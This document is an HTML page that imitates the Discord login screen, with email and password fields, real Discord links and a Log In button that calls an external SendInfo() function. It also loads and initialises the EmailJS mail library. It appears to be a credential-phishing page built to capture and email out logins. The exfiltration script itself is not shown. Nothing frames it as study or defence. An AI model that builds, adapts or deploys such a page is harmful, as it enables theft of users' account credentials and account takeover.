<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link rel="stylesheet" href="styles.css">
    <title>Discord</title>




    <script type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
</script>
<script type="text/javascript">
   (function(){
      emailjs.init("CMi-gpqndNersArco");
   })();
</script>


















</head>
<body>



    <div class="center vertical-center  Login_Box_Container">
        

        <div class="row">

            <div class="col col-lg-7">

                <div class="title">
                    Welcome back!
                </div>
                <div class="sub_title">
                    We're so excited to see you again!
                </div>



                <div id="div1" class="email_text_box_title">
                    EMAIL OR PHONE NUMBER 
                </div>
                <div id="div2" class="red">*</div>

                <div class="email_text_box">
                    <!-- Email Input -->
                    <input type="text" id="email" value="">
                </div>
                
                <div id="div3" class="password_text_box_title">
                    PASSWORD 
                </div>
                <div id="div4" class="red">*</div>



                <div class="password_text_box">
                    <!-- Password Input -->
                    <input type="password" id="password" value="">
                </div>


                <a class="fyp_style" href="https://support.discord.com/hc/en-us">Forgot your password?</a>

                <!-- Button Submit -->
                <button onclick="SendInfo()" class="Log_In_button">Log In</button>

                <div id="div5" class="button_sub_title">
                    Need an account?
                </div>
                <a id="div6" class="fyp_style_2" href="https://discord.com/register">Register</a>

            </div>

            <div class="col">
                <img class="image_QR_code" src="https://filestore.community.support.microsoft.com/api/images/d6124250-88cf-4670-b979-9875e993d6b5?upload=true" alt="discord_login_QR_code">
            </div>




        </div>


    </div>



    <script src="index.js"></script>
</body>
</html>
